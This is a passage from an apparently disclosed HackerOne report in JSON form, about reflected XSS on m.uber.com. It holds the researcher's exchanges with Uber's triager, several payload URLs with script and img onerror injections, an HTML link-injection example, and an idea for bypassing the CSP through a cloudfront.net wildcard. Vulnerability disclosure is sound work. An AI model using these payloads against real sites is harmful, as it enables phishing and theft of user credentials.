{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": true, 
    "substate": "duplicate", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "muhammad_uwais", 
        "fa1rlight", 
        "gregoryvperry"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": 276134, 
    "id": 296701, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-12-24T20:46:17.028Z", 
    "vulnerability_information": "## Summary\nm.uber.com is susceptible to reflected XSS\n\n## Security Impact\nA malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com\n\n## Reproduction Steps\nhttps://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1\n\n## Specifics\nFrom the rendered web page:\n```\n{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"bjbxm</script><script>alert(1)</script>xrii5\":\"1\"}\n```\nNo further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser's XSS _Auditor protections.\n\n## Impact\n\nAn attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "none", 
            "user_interaction": "none", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "changed", 
            "integrity": "high", 
            "availability": "none"
        }, 
        "rating": "critical", 
        "score": 10.0, 
        "author_type": "User"
    }, 
    "title": "SSL-protected Reflected XSS in m.uber.com", 
    "is_member_of_team?": null, 
    "vote_count": 3, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Duplicate", 
    "public": true, 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-12-11T15:42:37.976Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-11T15:42:37.976Z", 
            "actor": {
                "username": "fletcher", 
                "url": "/fletcher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/090/ff77c612c467177339fdbacd37000fddabaec61b_medium.jpg?1420748005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "We'll take a look and follow-up when we've got more details.", 
            "markdown_message": "<p>We&#39;ll take a look and follow-up when we&#39;ve got more details.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2214576, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-15T17:55:37.957Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-15T17:55:37.957Z", 
            "actor": {
                "username": "fletcher", 
                "url": "/fletcher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/090/ff77c612c467177339fdbacd37000fddabaec61b_medium.jpg?1420748005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "In our testing, JavaScript execution is not possible because quotes are properly escaped -- do you have a PoC that actually demonstrates XSS?", 
            "markdown_message": "<p>In our testing, JavaScript execution is not possible because quotes are properly escaped -- do you have a PoC that actually demonstrates XSS?</p>\n", 
            "type": "Activities::BugNeedsMoreInfo", 
            "id": 2226707, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-15T20:25:11.886Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-15T20:25:11.886Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hello Rob,\n\nReally trying to avoid this scenario based upon the last three reports being closed due to \"we knew about this issue already\" etc. It would also appear that changes have already been made to the backend application associated with the reported link above, as the response I am getting now after testing that link differs from the original responses that I have cached here locally from m.uber.com.\n\nThis particular attack vector is still sufficient to trigger the XSS_Auditor protections of Chromium Browser, but only on Linux - my Windows 10 box renders the injected frame without issue.\n\nI will research the issue more this weekend to generate a more palatable POC.\n\nIt would be great if you could direct your development staff to hold off on making any application changes during that period.", 
            "markdown_message": "<p>Hello Rob,</p>\n\n<p>Really trying to avoid this scenario based upon the last three reports being closed due to &quot;we knew about this issue already&quot; etc. It would also appear that changes have already been made to the backend application associated with the reported link above, as the response I am getting now after testing that link differs from the original responses that I have cached here locally from m.uber.com.</p>\n\n<p>This particular attack vector is still sufficient to trigger the XSS_Auditor protections of Chromium Browser, but only on Linux - my Windows 10 box renders the injected frame without issue.</p>\n\n<p>I will research the issue more this weekend to generate a more palatable POC.</p>\n\n<p>It would be great if you could direct your development staff to hold off on making any application changes during that period.</p>\n", 
            "type": "Activities::BugNew", 
            "id": 2227782, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-15T22:14:41.455Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-15T22:14:41.455Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Is uberinternal.com in scope for testing. It frequently shows up in various uber.com domains but is not specifically referenced as in scope for the Uber Bug Bounty.", 
            "markdown_message": "<p>Is uberinternal.com in scope for testing. It frequently shows up in various uber.com domains but is not specifically referenced as in scope for the Uber Bug Bounty.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2228140, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-15T22:30:17.915Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-15T22:30:17.915Z", 
            "actor": {
                "username": "fletcher", 
                "url": "/fletcher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/090/ff77c612c467177339fdbacd37000fddabaec61b_medium.jpg?1420748005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Sounds good -- we'll keep an eye out for the new PoC.\n\nFor scope details, we focus on security impact buckets -- if a given vulnerability report lands in one of those buckets (and doesn't have mitigating factors that result in security impact being negligible) they are in-scope. We have a small list of out-of-scope domains, but we don't define a list of in-scope domains as we believe that model isn't an accurate way to understand the security impact of any given report.", 
            "markdown_message": "<p>Sounds good -- we&#39;ll keep an eye out for the new PoC.</p>\n\n<p>For scope details, we focus on security impact buckets -- if a given vulnerability report lands in one of those buckets (and doesn&#39;t have mitigating factors that result in security impact being negligible) they are in-scope. We have a small list of out-of-scope domains, but we don&#39;t define a list of in-scope domains as we believe that model isn&#39;t an accurate way to understand the security impact of any given report.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2228166, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-19T03:14:33.971Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-19T03:14:33.971Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "I am not seeing how quotes are escaped at this https://m.uber.com endpoint. In fact, any arbitrary input can be reflected after the query string and I've been able to close out the originating script with a crafted urlencoded </script> tag. I have not yet been able to generate an alert which may be due to content sniffing in the browser, but I don't think so as the page itself is content type text/html. Don't close out this report as I am still working on some other options.\n\n", 
            "markdown_message": "<p>I am not seeing how quotes are escaped at this <a title=\"https://m.uber.com\" href=\"/redirect?signature=9727bbbff633a816f817cba0e24c133a0ff409e1&amp;url=https%3A%2F%2Fm.uber.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://m.uber.com</span><i class=\"icon-external-link\"></i></a> endpoint. In fact, any arbitrary input can be reflected after the query string and I&#39;ve been able to close out the originating script with a crafted urlencoded &lt;/script&gt; tag. I have not yet been able to generate an alert which may be due to content sniffing in the browser, but I don&#39;t think so as the page itself is content type text/html. Don&#39;t close out this report as I am still working on some other options.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2233468, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T16:10:38.654Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T16:10:38.654Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "m.uber.com is definitely vulnerable. Although the page has content sniffing enabled, the content type is text/html which gives me the ability to inject a </script> tag into the query string followed by rendering of arbitrary javascript and/or html.\n\nhttps://m.uber.com/?</ScrIpt><script>alert(1)</script> \nhttps://m.uber.com/?</ScrIpt><script>(/X/)</script>\n\ngenerates a javascript popup in Trident and Webkit-based browsers, triggers XSS_Auditor in Chrome, triggers Internet Explorer's XSS protections, and is being rendered in the resulting html document without any escaping:\n```\n{\"fb\":\"lite:os6DDzUYcFwRIHl9FUCbrBhmasr78yA9\"},\"fbAppId\":\"277064115737714\",\"fbSDKVersion\":\"v2.6\",\"deferredSignUp\":true,\"enabledFeatures\":{\"promotionsEnabled\":true},\"pageCreatedAt\":1513958970175,\"uditoken\":{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"</ScrIpt><script>(/X/)</script>\":\"\"},\"useragent\":{\"ua\":\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 \n```", 
            "markdown_message": "<p>m.uber.com is definitely vulnerable. Although the page has content sniffing enabled, the content type is text/html which gives me the ability to inject a &lt;/script&gt; tag into the query string followed by rendering of arbitrary javascript and/or html.</p>\n\n<p><a title=\"https://m.uber.com/\" href=\"/redirect?signature=47bf9dd431b54c336d7b8bef8d62733bcdc4ac7f&amp;url=https%3A%2F%2Fm.uber.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://m.uber.com/</span><i class=\"icon-external-link\"></i></a>?&lt;/ScrIpt&gt;&lt;script&gt;alert(1)&lt;/script&gt; <br>\n<a title=\"https://m.uber.com/\" href=\"/redirect?signature=47bf9dd431b54c336d7b8bef8d62733bcdc4ac7f&amp;url=https%3A%2F%2Fm.uber.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://m.uber.com/</span><i class=\"icon-external-link\"></i></a>?&lt;/ScrIpt&gt;&lt;script&gt;(/X/)&lt;/script&gt;</p>\n\n<p>generates a javascript popup in Trident and Webkit-based browsers, triggers XSS_Auditor in Chrome, triggers Internet Explorer&#39;s XSS protections, and is being rendered in the resulting html document without any escaping:</p>\n<pre class=\"highlight plaintext\"><code>{&quot;fb&quot;:&quot;lite:os6DDzUYcFwRIHl9FUCbrBhmasr78yA9&quot;},&quot;fbAppId&quot;:&quot;277064115737714&quot;,&quot;fbSDKVersion&quot;:&quot;v2.6&quot;,&quot;deferredSignUp&quot;:true,&quot;enabledFeatures&quot;:{&quot;promotionsEnabled&quot;:true},&quot;pageCreatedAt&quot;:1513958970175,&quot;uditoken&quot;:{&quot;enabled&quot;:true,&quot;sid&quot;:&quot;bbc661585c424072&quot;,&quot;url&quot;:&quot;www.cdn-net.com&quot;,&quot;cf&quot;:1022963},&quot;queryParams&quot;:{&quot;&lt;/ScrIpt&gt;&lt;script&gt;(/X/)&lt;/script&gt;&quot;:&quot;&quot;},&quot;useragent&quot;:{&quot;ua&quot;:&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 \n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 2242627, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T16:19:01.834Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T16:19:01.834Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "m.uber.com also has script-src set which can be bypassed due to the *.cloudfront.net wildcard (I could simply enable Cloudfront in my AWS console and then inject files from the *.cloudfront.net host I control), in addition to a missing base-uri which are both considered high severity findings under Content Security Policy 3.", 
            "markdown_message": "<p>m.uber.com also has script-src set which can be bypassed due to the *.cloudfront.net wildcard (I could simply enable Cloudfront in my AWS console and then inject files from the *.cloudfront.net host I control), in addition to a missing base-uri which are both considered high severity findings under Content Security Policy 3.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2242640, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T16:29:20.200Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T16:29:20.200Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Another valid payload:\n\nhttps://m.uber.com/?%3C/ScrIpt%3E%3Cscript%3E(/X/)%3C/script%3E\n\nResulting in:\n\n```\nledFeatures\":{\"promotionsEnabled\":true},\"pageCreatedAt\":1513960039898,\"uditoken\":{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"\\\"></script><script>/*\\\"/*'/**/;alert(1)//</script>\":\"\"},\"useragent\":{\"ua\":\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 \n```\n\nValid </script> with arbitrary javascript injection that is not escaped.\n\n", 
            "markdown_message": "<p>Another valid payload:</p>\n\n<p><a title=\"https://m.uber.com/?%3C/ScrIpt%3E%3Cscript%3E(/X/)%3C/script%3E\" href=\"/redirect?signature=73abd9c2af8d8e698188b5b894d41785388d2d11&amp;url=https%3A%2F%2Fm.uber.com%2F%3F%253C%2FScrIpt%253E%253Cscript%253E%28%2FX%2F%29%253C%2Fscript%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://m.uber.com/?%3C/ScrIpt%3E%3Cscript%3E(/X/)%3C/script%3E</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Resulting in:</p>\n<pre class=\"highlight plaintext\"><code>ledFeatures&quot;:{&quot;promotionsEnabled&quot;:true},&quot;pageCreatedAt&quot;:1513960039898,&quot;uditoken&quot;:{&quot;enabled&quot;:true,&quot;sid&quot;:&quot;bbc661585c424072&quot;,&quot;url&quot;:&quot;www.cdn-net.com&quot;,&quot;cf&quot;:1022963},&quot;queryParams&quot;:{&quot;\\&quot;&gt;&lt;/script&gt;&lt;script&gt;/*\\&quot;/*&#39;/**/;alert(1)//&lt;/script&gt;&quot;:&quot;&quot;},&quot;useragent&quot;:{&quot;ua&quot;:&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 \n</code></pre>\n<p>Valid &lt;/script&gt; with arbitrary javascript injection that is not escaped.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2242679, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T16:31:35.722Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T16:31:35.722Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Another valid payload:\n\nhttps://m.uber.com/?\"></script \"/*'/*><img/src=x */; onerror=alert(1) //\n\nResulting in:\n\n```\n{\"enabled\":true,\"sid\":\"bbc661585c424072\",\"url\":\"www.cdn-net.com\",\"cf\":1022963},\"queryParams\":{\"\\\"></script \\\"/*'/*><img/src\":\"x */; onerror=alert(1) //\"},\"useragent\":{\"ua\":\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0\",\"browser\":\n```\n\n", 
            "markdown_message": "<p>Another valid payload:</p>\n\n<p><a title=\"https://m.uber.com/?%22%3E\" href=\"/redirect?signature=706a4986d323ab6677fe14590b41230918ff54ba&amp;url=https%3A%2F%2Fm.uber.com%2F%3F%2522%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://m.uber.com/?%22%3E</span><i class=\"icon-external-link\"></i></a>&lt;/script &quot;/*&#39;/*&gt;&lt;img/src=x */; onerror=alert(1) //</p>\n\n<p>Resulting in:</p>\n<pre class=\"highlight plaintext\"><code>{&quot;enabled&quot;:true,&quot;sid&quot;:&quot;bbc661585c424072&quot;,&quot;url&quot;:&quot;www.cdn-net.com&quot;,&quot;cf&quot;:1022963},&quot;queryParams&quot;:{&quot;\\&quot;&gt;&lt;/script \\&quot;/*&#39;/*&gt;&lt;img/src&quot;:&quot;x */; onerror=alert(1) //&quot;},&quot;useragent&quot;:{&quot;ua&quot;:&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0&quot;,&quot;browser&quot;:\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 2242681, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T18:00:56.630Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T18:00:56.630Z", 
            "actor": {
                "username": "lindsey-uber", 
                "url": "/lindsey-uber", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Thanks for another one, @gregperry. We're looking into this now and will follow up as we have more details.", 
            "markdown_message": "<p>Thanks for another one, <a href=\"/gregperry\">@gregperry</a>. We&#39;re looking into this now and will follow up as we have more details.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2242931, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T18:44:13.530Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T18:44:13.530Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "This application's XSS filtering attempts to escape double quotes, but allows single quotes which is valid html.\n\nHere is an example of generating some arbitrary text using single quotes, all SSL-encrypted with Uber's signed certificate, and without Chrome's XSS_Auditor triggering:\n\nhttps://m.uber.com/?asdf\"}}</script><div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27><a%20href%3D\"http%3A%2F%2Fwww.lyft.com\">Some%20arbitrary%20link%20text<%2Fa><%2Fdiv>%0A\n\nI trust this issue, at the very least, is now validated as a critical security vulnerability.", 
            "markdown_message": "<p>This application&#39;s XSS filtering attempts to escape double quotes, but allows single quotes which is valid html.</p>\n\n<p>Here is an example of generating some arbitrary text using single quotes, all SSL-encrypted with Uber&#39;s signed certificate, and without Chrome&#39;s XSS_Auditor triggering:</p>\n\n<p><a title=\"https://m.uber.com/?asdf%22%7D\" href=\"/redirect?signature=5192b58e385e5b0653f109d55a3121d5d3a0214a&amp;url=https%3A%2F%2Fm.uber.com%2F%3Fasdf%2522%257D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://m.uber.com/?asdf%22%7D</span><i class=\"icon-external-link\"></i></a>}&lt;/script&gt;&lt;div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27&gt;&lt;a%20href%3D&quot;http%3A%2F%2Fwww.lyft.com&quot;&gt;Some%20arbitrary%20link%20text&lt;%2Fa&gt;&lt;%2Fdiv&gt;%0A</p>\n\n<p>I trust this issue, at the very least, is now validated as a critical security vulnerability.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2243055, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T19:07:39.449Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T19:07:39.449Z", 
            "actor": {
                "username": "fletcher", 
                "url": "/fletcher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/090/ff77c612c467177339fdbacd37000fddabaec61b_medium.jpg?1420748005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "We'll take a look into this one more time, but so far this is not a security bug that is in scope -- you've failed to demonstrate Javascript execution in a modern browser and the other behavior you allude to with \"generating some arbitrary text using single quotes\" sounds like simple content injection, which is out of scope for our program.\n\nPlease refrain from making theoretical arguments for why something has security impact and instead familiarize yourself with our scope page and demonstrate actual security impact that is in scope per our guidelines.", 
            "markdown_message": "<p>We&#39;ll take a look into this one more time, but so far this is not a security bug that is in scope -- you&#39;ve failed to demonstrate Javascript execution in a modern browser and the other behavior you allude to with &quot;generating some arbitrary text using single quotes&quot; sounds like simple content injection, which is out of scope for our program.</p>\n\n<p>Please refrain from making theoretical arguments for why something has security impact and instead familiarize yourself with our scope page and demonstrate actual security impact that is in scope per our guidelines.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2243133, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T19:35:16.312Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T19:35:16.312Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hello Rob,\n\nThis is reflected XSS, and certainly in scope. For example, here is the Uber sample report:\n\n```\n## Summary\nreflected XSS in partners.uber.com\n\n## Security Impact\nSince partners.uber.com has an authenticated experience, an XSS in this domain\nmeans an attacker can forge authenticated requests on behalf of the victim.\nAlso, advanced phishing attacks and defacement are possible.\n\n## Reproduction Steps\nThis is a reflected XSS in `partners.uber.com/ via the `lang` querystring\nparameter via the route `/documents`.\n```\nThis particular issue is almost word-for-word the same as your sample vulnerability report, with a POC that executes arbitrary html from an SSL-protected Uber website, so I don't know how you could possibly say this is not in scope unless you are just engaging in blatant employment discrimination at this point.\n", 
            "markdown_message": "<p>Hello Rob,</p>\n\n<p>This is reflected XSS, and certainly in scope. For example, here is the Uber sample report:</p>\n<pre class=\"highlight plaintext\"><code>## Summary\nreflected XSS in partners.uber.com\n\n## Security Impact\nSince partners.uber.com has an authenticated experience, an XSS in this domain\nmeans an attacker can forge authenticated requests on behalf of the victim.\nAlso, advanced phishing attacks and defacement are possible.\n\n## Reproduction Steps\nThis is a reflected XSS in `partners.uber.com/ via the `lang` querystring\nparameter via the route `/documents`.\n</code></pre>\n<p>This particular issue is almost word-for-word the same as your sample vulnerability report, with a POC that executes arbitrary html from an SSL-protected Uber website, so I don&#39;t know how you could possibly say this is not in scope unless you are just engaging in blatant employment discrimination at this point.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2243205, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T19:39:22.026Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T19:39:22.026Z", 
            "actor": {
                "username": "fletcher", 
                "url": "/fletcher", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/090/ff77c612c467177339fdbacd37000fddabaec61b_medium.jpg?1420748005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "It's not XSS if you can't get Javascript to execute -- we're verifying your most recent payloads to see if they fire Javascript and will go from there.", 
            "markdown_message": "<p>It&#39;s not XSS if you can&#39;t get Javascript to execute -- we&#39;re verifying your most recent payloads to see if they fire Javascript and will go from there.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2243214, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-12-22T19:47:34.760Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-12-22T19:47:34.760Z", 
            "actor": {
                "username": "gregoryvperry", 
                "url": "/gregoryvperry", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hello Rob,\n\nAn XSS attack is not strictly constrained to javascript, and I've demonstrated the ability to render arbitrary html that is protected by an Uber-signed SSL certificate, a critical vulnerability in the various m.uber.com endpoints that could be used to harvest privileged information from Uber customers and drivers.\n\nSome various well accepted industry definitions for what constitutes Cross Site Scripting:\n\nhttps://www.webopedia.com/TERM/X/XSS.html \"Common languages used for XSS include JavaScript, VBScript, HTML, Perl, C++, ActiveX and Flash.\"\nhttps://en.wikipedia.org/wiki/Cross-site_scripting \"The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including ActiveX, Java, VBScript, Flash, or even HTML scripts), causing some confusion to newcomers to the field of information security.\"\nhttps://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Reflected_XSS_.28AKA_Non-Persistent_or_Type_II.29 \"Server XSS occurs when untrusted user supplied data is included in an HTML response generated by the server. The source of this data could be from the request, or from a stored location. As such, you can have both Reflected Server XSS and Stored Server XSS.\"\n\netc.", 
            "markdown_message": "<p>Hello Rob,</p>\n\n<p>An XSS attack is not strictly constrained to javascript, and I&#39;ve demonstrated the ability to render arbitrary html that is protected by an Uber-signed SSL certificate, a critical vulnerability in the various m.uber.com endpoints that could be used to harvest privileged information from Uber customers and drivers.</p>\n\n<p>Some various well accepted industry definitions for what constitutes Cross Site Scripting:</p>\n\n<p><a title=\"https://www.webopedia.com/TERM/X/XSS.html\" href=\"/redirect?signature=0e35ddc7a18cd6be6805c727cd0bb787d24f77b7&amp;url=https%3A%2F%2Fwww.webopedia.com%2FTERM%2FX%2FXSS.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.webopedia.com/TERM/X/XSS.html</span><i class=\"icon-external-link\"></i></a> &quot;Common languages used for XSS include JavaScript, VBScript, HTML, Perl, C++, ActiveX and Flash.&quot;<br>\n<a title=\"https://en.wikipedia.org/wiki/Cross-site_scripting\" href=\"/redirect?signature=74f27b73d0b33f4ebdaa59e1f2f3fab59476b9e4&amp;url=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FCross-site_scripting\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://en.wikipedia.org/wiki/Cross-site_scripting</span><i class=\"icon-external-link\"></i></a> &quot;The definition gradually expanded to encompass other modes of code injection, including persistent and non-JavaScript vectors (including ActiveX, Java, VBScript, Flash, or even HTML scripts), causing some confusion to 